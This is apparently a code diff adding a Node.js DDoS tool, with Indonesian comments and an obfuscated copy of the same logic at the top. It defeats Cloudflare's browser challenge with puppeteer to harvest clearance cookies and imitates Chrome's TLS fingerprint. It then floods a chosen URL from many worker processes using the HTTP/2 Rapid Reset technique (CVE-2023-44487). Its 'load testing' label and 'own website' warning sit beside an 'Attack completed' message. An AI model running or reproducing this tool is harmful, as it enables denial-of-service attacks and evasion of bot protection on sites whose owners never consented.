_0x5b6799=Math[_0x566415(0x107)](_0x368abb/args[_0x566415(0xc6)]*0x1e),_0x19a0b1='#'[_0x566415(0x17c)](_0x5b6799)+'-'['repeat'](0x1e-_0x5b6799);console[_0x566415(0xe2)](_0x566415(0x123)+_0x19a0b1+']\x1b[0m');}}global[_0x12ec67(0x185)]=0x0,global[_0x12ec67(0x13f)]=0x0,global[_0x12ec67(0x16f)]=0x0,global['startTime']=Date[_0x12ec67(0xea)](),global['bypassData']=[];if(cluster['isMaster'])console[_0x12ec67(0xd4)](),console[_0x12ec67(0xe2)](_0x12ec67(0xb9)),console['log']('\x1b[33mONLY\x20USE\x20FOR\x20YOUR\x20OWN\x20WEBSITE!\x1b[0m\x0a'),((async()=>{const _0x559538=_0x12ec67,_0x228476=await bypassCloudflareParallel(args[_0x559538(0xc2)]);global[_0x559538(0x166)]=_0x228476,console['log']('\x0a\x1b[32mSuccessfully\x20obtained\x20'+_0x228476[_0x559538(0xfe)]+_0x559538(0x10f)),console['log'](_0x559538(0x11d)),global[_0x559538(0xf9)]=Date[_0x559538(0xea)]();for(let _0x3384a7=0x0;_0x3384a7<args[_0x559538(0x163)];_0x3384a7++){const _0x25541a=cluster[_0x559538(0xf1)]();_0x25541a[_0x559538(0x12f)]({'type':'bypassData','data':_0x228476});}const _0x532622=setInterval(displayStats,0x3e8);cluster['on'](_0x559538(0xf7),(_0x464937,_0x582a7a)=>{const _0x3590ed=_0x559538;_0x582a7a['type']==='stats'&&(global['totalRequests']+=_0x582a7a['total']||0x0,global['successRequests']+=_0x582a7a[_0x3590ed(0x17a)]||0x0,global['failedRequests']+=_0x582a7a[_0x3590ed(0x152)]||0x0);}),cluster['on'](_0x559538(0x16d),_0x54f45d=>{const _0x2d60ef=_0x559538;if(Date[_0x2d60ef(0xea)]()-global['startTime']<args['time']*0x3e8){const _0x1c4bf8=cluster[_0x2d60ef(0xf1)]();_0x1c4bf8[_0x2d60ef(0x12f)]({'type':_0x2d60ef(0x166),'data':_0x228476});}}),setTimeout(()=>{const _0x427250=_0x559538;clearInterval(_0x532622),displayStats(),console[_0x427250(0xe2)](_0x427250(0xc0)),console[_0x427250(0xe2)](_0x427250(0x181)),console[_0x427250(0xe2)]('\x20\x20\x20Total\x20requests:\x20'+global[_0x427250(0x185)]),console['log'](_0x427250(0x15d)+global[_0x427250(0x13f)]),console[_0x427250(0xe2)](_0x427250(0x10c)+global[_0x427250(0x16f)]),console[_0x427250(0xe2)](_0x427250(0x119)+_0x228476['length']),process['exit'](0x0);},args[_0x559538(0xc6)]*0x3e8);})());else{let workerBypassData=[],attackInterval;process['on'](_0x12ec67(0xf7),_0x555352=>{const _0x38d488=_0x12ec67;_0x555352[_0x38d488(0x18a)]===_0x38d488(0x166)&&(workerBypassData=_0x555352[_0x38d488(0x16e)],global[_0x38d488(0x166)]=_0x555352['data'],attackInterval=setInterval(()=>{for(let _0xcbe694=0x0;_0xcbe694<0xa;_0xcbe694++){runFlooder();}},0x64),setInterval(()=>{const _0x383157=_0x38d488;process[_0x383157(0x12f)]({'type':_0x383157(0xc9),'total':global[_0x383157(0x185)]||0x0,'success':global['successRequests']||0x0,'failed':global[_0x383157(0x16f)]||0x0}),global['totalRequests']=0x0,global[_0x383157(0x13f)]=0x0,global[_0x383157(0x16f)]=0x0;},0x3e8));}),setTimeout(()=>{const _0x5d3a6a=_0x12ec67;if(attackInterval)clearInterval(attackInterval);process[_0x5d3a6a(0x16d)](0x0);},args[_0x12ec67(0xc6)]*0x3e8);}process['on']('uncaughtException',()=>{}),process['on'](_0x12ec67(0xe1),()=>{});
+const { connect } = require("puppeteer-real-browser");
+const http2 = require("http2");
+const tls = require("tls");
+const cluster = require("cluster");
+const url = require("url");
+const crypto = require("crypto");
+
+// ============================================================
+// KONFIGURASI TLS FINGERPRINT (Menyerupai Chrome)
+// ============================================================
+const ciphers = [
+    "TLS_AES_128_GCM_SHA256",
+    "TLS_AES_256_GCM_SHA384",
+    "TLS_CHACHA20_POLY1305_SHA256",
+    "ECDHE-ECDSA-AES128-GCM-SHA256",
+    "ECDHE-RSA-AES128-GCM-SHA256",
+    "ECDHE-ECDSA-AES256-GCM-SHA384",
+    "ECDHE-RSA-AES256-GCM-SHA384",
+    "ECDHE-ECDSA-CHACHA20-POLY1305",
+    "ECDHE-RSA-CHACHA20-POLY1305",
+    "ECDHE-RSA-AES128-SHA",
+    "ECDHE-RSA-AES256-SHA",
+    "AES128-GCM-SHA256",
+    "AES256-GCM-SHA384",
+    "AES128-SHA",
+    "AES256-SHA"
+].join(":");
+
+const sigalgs = [
+    "ecdsa_secp256r1_sha256",
+    "rsa_pss_rsae_sha256",
+    "rsa_pkcs1_sha256",
+    "ecdsa_secp384r1_sha384",
+    "rsa_pss_rsae_sha384",
+    "rsa_pkcs1_sha384",
+    "rsa_pss_rsae_sha512",
+    "rsa_pkcs1_sha512"
+].join(":");
+
+const ecdhCurve = "X25519:P-256:P-384:P-521";
+
+// ============================================================
+// ARGS & ENTRY
+// ============================================================
+if (process.argv.length < 6) {
+    console.log("\x1b[31mUsage: node xb.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
+    console.log("\x1b[33mExample: node xb.js https://example.com 60 5 4 6\x1b[0m");
+    process.exit(1);
+}
+
+const args = {
+    target: process.argv[2],
+    time: parseInt(process.argv[3]),
+    rate: parseInt(process.argv[4]),
+    threads: parseInt(process.argv[5]),
+    cookieCount: parseInt(process.argv[6]) || 2,
+};
+
+// ============================================================
+// CLOUDFLARE BYPASS (Puppeteer)
+// ============================================================
+async function bypassCloudflareOnce(attemptNum = 1) {
+    let browser = null;
+    let page = null;
+
+    try {
+        console.log(`\x1b[33mBypass attempt ${attemptNum}...\x1b[0m`);
+
+        const response = await connect({
+            headless: false,
+            args: [
+                "--no-sandbox",
+                "--disable-setuid-sandbox",
+                "--disable-dev-shm-usage",
+                "--disable-accelerated-2d-canvas",
+                "--no-first-run",
+                "--no-zygote",
+                "--disable-gpu",
+                "--window-size=1920,1080",
+            ],
+            turnstile: true,
+            connectOption: { defaultViewport: null },
+        });
+
+        browser = response.browser;
+        page = response.page;
+
+        await page.evaluateOnNewDocument(() => {
+            Object.defineProperty(navigator, "webdriver", { get: () => undefined });
+        });
+
+        try {
+            await page.goto(args.target, {
+                waitUntil: "domcontentloaded",
+                timeout: 60000,
+            });
+        } catch (navError) {
+            console.log(`\x1b[33mNavigation warning: ${navError.message}\x1b[0m`);
+        }
+
+        let challengeCompleted = false;
+        let checkCount = 0;
+        const maxChecks = 120;
+
+        while (!challengeCompleted && checkCount < maxChecks) {
+            await new Promise((r) => setTimeout(r, 500));
+            try {
+                const cookies = await page.cookies();
+                if (cookies.some((c) => c.name === "cf_clearance")) {
+                    challengeCompleted = true;
+                    break;
+                }
+                challengeCompleted = await page.evaluate(() => {
+                    const title = (document.title || "").toLowerCase();
+                    const body = (document.body?.innerText || "").toLowerCase();
+                    if (
+                        title.includes("just a moment") ||
+                        title.includes("checking") ||
+                        body.includes("checking your browser") ||
+                        body.includes("cloudflare")
+                    ) return false;
+                    return document.body && document.body.children.length > 3;
+                });
+            } catch (_) {}
+            checkCount++;
+        }
+
+        await new Promise((r) => setTimeout(r, 1000));
+        const cookies = await page.cookies();
+        const userAgent = await page.evaluate(() => navigator.userAgent);
+        const cf = cookies.find((c) => c.name === "cf_clearance");
+
+        console.log(`\x1b[36mCookies: ${cookies.length} | cf_clearance: ${cf ? "YES" : "NO"}\x1b[0m`);
+
+        await page.close();
+        await browser.close();
+
+        return {
+            cookies,
+            userAgent,
+            cfClearance: cf ? cf.value : null,
+            success: cookies.length > 0,
+            attemptNum,
+        };
+    } catch (error) {
+        console.log(`\x1b[31mAttempt ${attemptNum} failed: ${error.message}\x1b[0m`);
+        try { if (page) await page.close(); } catch (_) {}
+        try { if (browser) await browser.close(); } catch (_) {}
+        return {
+            cookies: [],
+            userAgent:
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            cfClearance: null,
+            success: false,
+            attemptNum,
+        };
+    }
+}
+
+async function bypassCloudflareParallel(totalCount) {
+    console.log("\x1b[35mCLOUDFLARE BYPASS – PARALLEL\x1b[0m");
+    const results = [];
+    let attemptCount = 0;
+    const batchSize = 2;
+
+    while (results.length < totalCount) {
+        const remaining = totalCount - results.length;
+        const currentBatch = Math.min(batchSize, remaining);
+        const batch = [];
+        for (let i = 0; i < currentBatch; i++) {
+            attemptCount++;
+            batch.push(bypassCloudflareOnce(attemptCount));
+        }
+        const settled = await Promise.all(batch);
+        for (const r of settled) {
+            if (r.success) {
+                results.push(r);
+                console.log(`\x1b[32mSession ${r.attemptNum} OK (${results.length}/${totalCount})\x1b[0m`);
+            }
+        }
+        if (results.length < totalCount) {
+            await new Promise((r) => setTimeout(r, 2000));
+        }
+    }
+
+    if (results.length === 0) {
+        results.push({
+            cookies: [],
+            userAgent:
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            cfClearance: null,
+            success: true,
+        });
+    }
+    console.log(`\x1b[32mTotal sessions: ${results.length}\x1b[0m`);
+    return results;
+}
+
+// ============================================================
+// FLOODER – HTTP/2 Murni + Rapid Reset (CVE-2023-44487)
+// ============================================================
+function flood(userAgent, cookieString) {
+    try {
+        const parsed = url.parse(args.target);
+        const path = parsed.path || "/";
+
+        // Headers disusun sedemikian rupa menyerupai Chrome
+        const headers = {
+            ":method": "GET",
+            ":authority": parsed.host,
+            ":scheme": "https",
+            ":path": path,
+            "user-agent": userAgent,
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-user": "?1",
+            "sec-fetch-dest": "document",
+            "sec-ch-ua": `"Chromium";v="126", "Not)A;Brand";v="8", "Google Chrome";v="126"`,
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "upgrade-insecure-requests": "1",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-US,en;q=0.9",
+            "cookie": cookieString,
+            "priority": "u=0, i"
+        };
+
+        // Membuat TLS Socket dengan konfigurasi yang mendekati Chrome
+        const socket = tls.connect({
+            host: parsed.hostname,
+            port: parsed.port || 443,
+            servername: parsed.hostname,
+            ALPNProtocols: ["h2"],
+            ciphers: ciphers,
+            sigalgs: sigalgs,
+            ecdhCurve: ecdhCurve,
+            rejectUnauthorized: false,
+            minVersion: "TLSv1.2",
+            maxVersion: "TLSv1.3"
+        });
+
+        socket.setKeepAlive(true, 60000);
+        socket.setNoDelay(true);
+
+        const client = http2.connect(parsed.href, {
+            createConnection: () => socket,
+            settings: {
+                headerTableSize: 65536,
+                enablePush: false,
+                initialWindowSize: 6291456,
+                maxFrameSize: 16384,
+                maxHeaderListSize: 262144
+            }
+        });
+
+        client.on("connect", () => {
+            let active = true;
+
+            // Loop Rapid Reset
+            const sendRapidReset = () => {
+                if (!active || client.destroyed || client.closed) return;
+
+                // Kirim sejumlah request sekaligus (burst)
+                const burst = Math.max(1, args.rate);
+                for (let i = 0; i < burst; i++) {
+                    try {
+                        // endStream: false berarti kita hanya mengirim HEADERS, belum menutup stream
+                        const req = client.request(headers, { endStream: false });
+                        
+                        // Abaikan error pada stream
+                        req.on('error', () => {});
+                        
+                        // Segera kirim RST_STREAM(CANCEL) untuk memicu Rapid Reset
+                        req.close(http2.constants.NGHTTP2_CANCEL);
+                        
+                        // Tambah statistik SEGERA setelah frame dikirim
+                        // Ini memastikan statistik tidak 0 req/s meskipun server membalas 403
+                        global.totalRequests = (global.totalRequests || 0) + 1;
+                        global.successRequests = (global.successRequests || 0) + 1;
+                    } catch (err) {
+                        global.failedRequests = (global.failedRequests || 0) + 1;
+                    }
+                }
+
+                // Jeda antar burst (10ms - 20ms) agar event loop Node.js tidak freeze
+                setTimeout(sendRapidReset, 10 + Math.random() * 10);
+            };
+
+            sendRapidReset();
+
+            // Handle jika server mengirim GOAWAY (rate limit / proteksi)
+            client.on("goaway", () => {
+                active = false;
+                try { client.destroy(); } catch (_) {}
+                try { socket.destroy(); } catch (_) {}
+                // Reconnect setelah jeda
+                setTimeout(() => flood(userAgent, cookieString), 2000);
+            });
+
+            client.on("error", () => {
+                active = false;
+                try { client.destroy(); } catch (_) {}
+                try { socket.destroy(); } catch (_) {}
+                setTimeout(() => flood(userAgent, cookieString), 2000);
+            });
+
+            client.on("close", () => {
+                active = false;
+            });
+        });
+
+        client.on("error", () => {
+            // Abaikan error level sesi
+        });
+
+    } catch (err) {
+        // Abaikan error inisialisasi
+    }
+}
+
+// ============================================================
+// RUNNER & STATS
+// ============================================================
+function runFlooder() {
+    if (!global.bypassData || global.bypassData.length === 0) return;
+    const info = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
+    const cookieString = info.cookies.map((c) => `${c.name}=${c.value}`).join("; ");
+    flood(info.userAgent, cookieString);
+}
+
+function displayStats() {
+    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
+    const remaining = Math.max(0, args.time - elapsed);
+
+    console.clear();
+    console.log("\x1b[35mADVANCED LOAD TESTING (HTTP/2 RAPID RESET)\x1b[0m");
+    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
+    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s | Remaining: ${remaining}s`);
+    console.log(`\x1b[36mRate:\x1b[0m ${args.rate} burst | Threads: ${args.threads}`);
+    console.log(`\x1b[36mSessions:\x1b[0m ${global.bypassData.length} / ${args.cookieCount}`);
+    console.log(`\x1b[32mFrames Sent (Total):\x1b[0m ${global.totalRequests || 0}`);
+    console.log(`\x1b[31mFailed:\x1b[0m ${global.failedRequests || 0}`);
+    console.log(
+        `\x1b[33mSpeed:\x1b[0m ${elapsed > 0 ? ((global.totalRequests || 0) / elapsed).toFixed(2) : 0} req/s`
+    );
+}
+
+// ============================================================
+// MAIN EXECUTION
+// ============================================================
+global.totalRequests = 0;
+global.successRequests = 0;
+global.failedRequests = 0;
+global.startTime = Date.now();
+global.bypassData = [];
+
+if (cluster.isMaster) {
+    console.clear();
+    console.log("\x1b[35mADVANCED LOAD TESTING\x1b[0m");
+    console.log("\x1b[33mONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");
+
+    (async () => {
+        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
+        global.bypassData = bypassResults;
+        global.startTime = Date.now();
+
+        for (let i = 0; i < args.threads; i++) {
+            const worker = cluster.fork();
+            worker.send({ type: "bypassData", data: bypassResults });
+        }
+
+        const statsInterval = setInterval(displayStats, 1000);
+
+        cluster.on("message", (worker, message) => {
+            if (message.type === "stats") {
+                global.totalRequests += message.total || 0;
+                global.successRequests += message.success || 0;
+                global.failedRequests += message.failed || 0;
+            }
+        });
+
+        cluster.on("exit", () => {
+            if (Date.now() - global.startTime < args.time * 1000) {
+                const w = cluster.fork();
+                w.send({ type: "bypassData", data: bypassResults });
+            }
+        });
+
+        setTimeout(() => {
+            clearInterval(statsInterval);
+            displayStats();
+            console.log("\n\x1b[32mAttack completed.\x1b[0m");
+            process.exit(0);
+        }, args.time * 1000);
+    })();
+} else {
+    let attackInterval;
+
+    process.on("message", (msg) => {
+        if (msg.type === "bypassData") {
+            global.bypassData = msg.data;
+
+            // Loop pemanggil koneksi flooder
+            attackInterval = setInterval(() => {
+                for (let i = 0; i < 5; i++) {
+                    runFlooder();
+                }
+            }, 200);
+
+            // Pengirim statistik ke Master Process
+            setInterval(() => {
+                process.send({
+                    type: "stats",
+                    total: global.totalRequests || 0,
+                    success: global.successRequests || 0,
+                    failed: global.failedRequests || 0,
+                });
+                global.totalRequests = 0;
+                global.successRequests = 0;
+                global.failedRequests = 0;
+            }, 1000);
+        }
+    });
+
+    setTimeout(() => {
+        if (attackInterval) clearInterval(attackInterval);
+        process.exit(0);
+    }, args.time * 1000);
+}
+
+process.on("uncaughtException", () => {});
+process.on("unhandledRejection", () => {});
